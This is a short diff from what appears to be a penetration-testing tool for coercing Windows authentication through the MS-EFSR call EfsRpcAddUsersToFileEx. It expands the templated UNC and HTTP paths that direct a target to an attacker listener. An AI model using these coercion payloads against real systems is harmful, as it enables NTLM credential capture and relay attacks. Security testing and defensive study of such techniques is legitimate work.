@@ -63,9 +63,10 @@ class EfsRpcAddUsersToFileEx(MSPROTOCOLRPCCALL):
     """
 
     exploit_paths = [
-        ("smb", '\\\\{{listener}}\\Share\\file.txt\x00'),
-        ("smb", '\\\\{{listener}}\\Share\\\x00'),
-        ("smb", '\\\\{{listener}}\\Share\x00'),
+        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
+        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
+        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
+        ("http", '\\\\{{listener}}{{http_listen_port}}/{{rnd(3)}}\\share\\file.txt\x00'),
     ]
 
     access = {
